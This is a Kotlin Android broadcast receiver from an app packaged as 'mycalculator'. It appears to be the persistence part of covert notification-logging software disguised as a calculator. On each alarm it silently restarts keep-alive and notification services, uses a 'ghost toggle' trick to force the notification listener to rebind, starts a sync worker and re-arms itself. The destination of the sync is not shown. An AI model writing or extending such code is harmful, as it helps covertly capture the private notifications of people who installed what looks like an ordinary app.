package com.android.mycalculator

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.service.notification.NotificationListenerService

class AlarmReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        // Acquire wake lock with try-finally to prevent leaks
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "NotifyLog:AlarmWakeLock"
        )
        
        try {
            wakeLock.acquire(30000) // 30 seconds (increased from 10)
            
            // Check and restart services silently
            context.startService(Intent(context, KeepAliveService::class.java))
            context.startService(Intent(context, NotificationService::class.java))
            
            // NEW: The Ghost Toggle - Shocks the listener back to life
            val pm = context.packageManager
            val ghostComponent = ComponentName(context, GhostReceiver::class.java) // FIXED: Renamed to ghostComponent
            pm.setComponentEnabledSetting(ghostComponent, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
            pm.setComponentEnabledSetting(ghostComponent, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)

            // Rebind notification listener
            val listenerComponent = ComponentName(context, NotificationService::class.java) // FIXED: Renamed to listenerComponent
            NotificationListenerService.requestRebind(listenerComponent)
            
            // Force a sync
            val syncIntent = Intent(context, SyncWorker::class.java)
            context.startService(syncIntent)
            
            // Set next alarm
            AlarmScheduler.scheduleNextAlarm(context)
            
        } finally {
            // Always release, even if there's an error
            if (wakeLock.isHeld) {
                wakeLock.release()
            }
        }
    }
}
